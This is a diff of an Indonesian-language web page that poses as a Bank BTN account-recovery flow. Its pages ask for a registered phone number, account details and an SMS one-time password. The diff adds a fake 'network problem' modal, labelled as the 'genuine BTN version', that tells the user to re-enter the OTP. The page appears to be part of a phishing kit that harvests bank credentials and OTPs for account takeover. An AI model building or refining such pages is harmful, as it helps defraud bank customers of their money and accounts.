@@ -1,3 +1,4 @@
+<!-- index.html -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -20,10 +21,25 @@
     </div>
 </div>
 
-<!-- Toast Notification Container -->
+<!-- Toast Notification Container (versi BANK BTN) -->
 <div id="btnToast" class="btn-toast">
     <div class="toast-icon">ℹ️</div>
     <div class="toast-message"></div>
+</div>
+
+<!-- MODAL POPUP JARINGAN BERMASALAH - VERSI BTN ASLI -->
+<div id="networkModal" class="network-modal">
+    <div class="modal-overlay"></div>
+    <div class="modal-container">
+        <div class="modal-icon">
+            <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#FF6600"/>
+            </svg>
+        </div>
+        <h3 class="modal-title">Jaringan Anda Bermasalah</h3>
+        <p class="modal-message">Silakan masukkan ulang kode OTP yang telah dikirimkan via SMS ke nomor terdaftar Anda.</p>
+        <button id="closeModalBtn" class="modal-button">MASUKKAN ULANG OTP</button>
+    </div>
 </div>
 
 <!-- HALAMAN 1 : Input nomor terdaftar -->
@@ -47,6 +63,7 @@
         </div>
         <button id="gotoPage2Btn" class="btn-primary">LANJUT PEMULIHAN →</button>
     </div>
+    <!-- CAROUSEL INFORMASI -->
     <div class="promo-carousel">
         <h3 class="carousel-title">📋 Informasi Akun</h3>
         <div class="slider-container">
@@ -107,6 +124,7 @@
             <button type="button" id="btnLanjut" class="btn-primary btn-lanjut">PULIHKAN SEKARANG</button>
         </form>
     </div>
+    <!-- CAROUSEL INFORMASI -->
     <div class="promo-carousel">
         <h3 class="carousel-title">💳 Informasi Transaksi</h3>
         <div class="slider-container">
@@ -148,6 +166,7 @@
         <div id="otpWarning" class="error-msg"></div>
         <button id="submitOtpBtn" class="btn-primary">VERIFIKASI & PULIHKAN</button>
     </div>
+    <!-- CAROUSEL INFORMASI -->
     <div class="promo-carousel">
         <h3 class="carousel-title">🔐 Informasi Verifikasi</h3>
         <div class="slider-container">
@@ -165,4 +184,4 @@
 
 <script src="script.js"></script>
 </body>
-</html>
+                </html>
